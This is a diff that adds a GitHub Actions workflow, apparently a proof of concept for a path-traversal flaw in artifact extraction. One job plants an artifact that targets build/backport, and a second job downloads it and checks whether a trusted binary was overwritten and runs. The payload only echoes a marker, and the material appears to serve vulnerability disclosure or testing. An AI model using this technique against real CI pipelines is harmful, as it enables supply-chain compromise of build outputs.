@@ -1,0 +1,44 @@
+name: POC v8 extraction traversal -> backport binary
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  plant:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - run: |
+          mkdir -p poc-payload
+          printf '#!/bin/sh\necho PWNED_FROM_ARTIFACT\n' > poc-payload/backport
+          chmod +x poc-payload/backport
+      - working-directory: .github/actions/plant-v8
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - uses: ./.github/actions/plant-v8
+        with:
+          name: pr-packages-999
+          source: poc-payload/backport
+          target: build/backport
+  consume:
+    needs: plant
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+      - name: create trusted binary like go build would
+        run: |
+          mkdir -p build artifacts
+          printf '#!/bin/sh\necho ORIGINAL_TRUSTED_BACKPORT\n' > build/backport
+          chmod 755 build/backport
+      - name: download attacker artifact exactly like the target workflow
+        continue-on-error: true
+        uses: actions/download-artifact@v8
+        with:
+          name: pr-packages-999
+          path: artifacts
+      - name: verify overwrite and execution
+        run: |
+          echo "mode=$(stat -c '%a' build/backport)"
+          echo "content:"; cat build/backport
+          echo "exec:"; ./build/backport || echo "EXEC_FAILED"
